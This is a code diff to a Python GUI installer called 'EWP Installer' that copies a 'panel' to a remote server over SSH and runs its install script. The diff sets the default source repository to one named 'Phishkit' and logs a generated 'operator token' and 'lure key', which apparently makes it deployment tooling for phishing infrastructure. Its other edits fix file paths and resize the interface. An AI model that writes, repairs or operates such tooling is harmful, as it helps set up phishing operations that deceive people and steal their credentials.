@@ -46,7 +46,7 @@ DEFAULTS = {
     "password": "",
     "domain": "",
     "cf_token": "",
-    "repo_url": "https://github.com/CHANGE_ME/ewp-installer.git",
+    "repo_url": "https://github.com/spy890-cyber/Phishkit.git",
     "repo_branch": "main",
     "repo_token": "",
     "install_mode": "full",
@@ -217,6 +217,8 @@ def run_install(cfg, mode, log):
 
     operator_token = os.urandom(32).hex()
     lure_key = os.urandom(16).hex()
+    log(f"[*] operator token: {operator_token}")
+    log(f"[*] lure key:       {lure_key}")
 
     log("[*] connecting SSH")
     client = make_ssh_client(cfg, log)
@@ -224,7 +226,9 @@ def run_install(cfg, mode, log):
         return False
 
     try:
-        scp_tree(client, PANEL_DIR, "/tmp/ewp-panel", log)
+        # Copy local panel/ into /tmp/ewp-panel/panel so install.sh, which
+        # expects $PKG_DIR/panel/..., finds every file at the right path.
+        scp_tree(client, PANEL_DIR, "/tmp/ewp-panel/panel", log)
         scp_file(client, PANEL_DIR / "install.sh", "/tmp/ewp-install.sh", log)
         stream_cmd(client, "chmod +x /tmp/ewp-install.sh && sed -i 's/\\r$//' /tmp/ewp-install.sh", log)
 
@@ -258,7 +262,7 @@ class App(ctk.CTk):
         ctk.set_default_color_theme("dark-blue")
 
         self.title("EWP Installer")
-        self.geometry("720x760")
+        self.geometry("720x820")
 
         self.cfg = load_config()
         self.log_queue = queue.Queue()
@@ -336,7 +340,7 @@ class App(ctk.CTk):
                       command=self._copy_log).pack(side="right")
 
         ctk.CTkLabel(self, text="Progress", anchor="w").pack(fill="x", padx=20)
-        self.log_box = ctk.CTkTextbox(self, height=280, font=ctk.CTkFont(family="Consolas", size=12))
+        self.log_box = ctk.CTkTextbox(self, height=300, font=ctk.CTkFont(family="Consolas", size=12))
         self.log_box.pack(fill="both", expand=True, padx=20, pady=(4, 20))
         self.log_box.configure(state="disabled")
 
